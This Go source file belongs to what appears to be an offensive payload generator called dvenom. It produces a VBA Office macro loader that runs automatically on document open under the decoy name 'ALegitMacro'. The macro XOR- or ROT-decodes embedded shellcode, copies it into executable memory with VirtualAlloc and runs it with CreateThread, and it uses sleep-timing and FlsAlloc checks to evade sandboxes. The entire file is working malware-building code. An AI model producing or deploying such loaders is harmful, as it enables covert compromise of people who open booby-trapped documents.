package payloads

import (
	"bytes"
	"fmt"
	"log"
	"strconv"
	"strings"
	"text/template"

	"github.com/Zerx0r/dvenom/internal/cryptor"
	"github.com/Zerx0r/dvenom/internal/helpers"
)

func vbaShellCodeLoader() string {
	return `
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr
Sub ALegitMacro()
	Dim allocRes As LongPtr
	Dim t1 As Date
	Dim t2 As Date
	Dim time As Long
	Dim buf As Variant
	Dim addr As LongPtr
	Dim counter As Long
	Dim data As Long
	Dim res As LongPtr

	allocRes = FlsAlloc(0)
	If IsNull(allocRes) Then
		Exit Sub
	End If
	
	t1 = Now()
	Sleep (5000)
	t2 = Now()
	time = DateDiff("s", t1, t2)
	If time < 4.8 Then
		Exit Sub
	End If
	
	buf = Array({{.Values.ShellCode}})
	
	addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

{{.Values.DecodeFunc}}
	
	For counter = LBound(buf) To UBound(buf)
		data = buf(counter)
		res = RtlMoveMemory(addr + counter, data, 1)
	Next counter

	res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
Sub Document_Open()
	ALegitMacro
End Sub
Sub AutoOpen()
	ALegitMacro
End Sub
	`
}

func vbaXor(xorKey string) string {
	str := `
	Dim key
	key = "%s"
	For i = 0 To UBound(buf)
		buf(i) = buf(i) Xor Asc(Mid(key, (i Mod Len(key)) + 1, 1))
	Next
	`
	return fmt.Sprintf(str, xorKey)
}
func vbaRot(rotKey string) string {
	str := `
    For i = 0 To UBound(buf)
		buf(i) = ((buf(i) - %s) + 256) Mod 256
    Next
	`
	return fmt.Sprintf(str, rotKey)
}

func bytesToVbaArray(shellCode []byte) string {
	var stringsArray []string
	for i, b := range shellCode {
		if i+1 == len(shellCode) {
			stringsArray = append(stringsArray, strconv.Itoa(int(b)))

		} else {
			stringsArray = append(stringsArray, strconv.Itoa(int(b))+", ")
		}
		if (i+1)%50 == 0 {
			stringsArray = append(stringsArray, "_\n")
		}
	}
	result := strings.Join(stringsArray, "")
	return result
}

func BuildVBATemplate(methodType string, cipherType string, key string, shellCode []byte) string {

	field := helpers.Field{
		Values: make(map[string]string),
	}
	var value []byte
	switch cipherType {
	case "xor":
		value = cryptor.Xor(key, shellCode)
		field.SetValue("DecodeFunc", vbaXor(key))
	case "rot":
		value = cryptor.Rot(key, shellCode)
		field.SetValue("DecodeFunc", vbaRot(key))
	default:
		log.Fatalf("[x] Error: Cipher type %s is not supported with vba payload. Supported types: (xor, rot)", cipherType)
	}
	field.SetValue("ShellCode", bytesToVbaArray(value))
	switch methodType {
	case "valloc":
		return buildVBATemplate(field, vbaShellCodeLoader())
	default:
		log.Fatalf("[x] Error: Method type %s is not supported in vba payload. Supported types: (valloc)", methodType)
		return ""
	}
}

func buildVBATemplate(field helpers.Field, vbaTemplate string) string {
	var buffer bytes.Buffer
	t, err := template.New("VBAMacro").Parse(vbaTemplate)
	if err != nil {
		log.Fatal("[x] Error: Failed to generate vba code.", err)
	}

	if err := t.Execute(&buffer, field); err != nil {
		log.Fatal("[x] Error: Failed to generate vba code.", err)
	}
	return buffer.String()
}
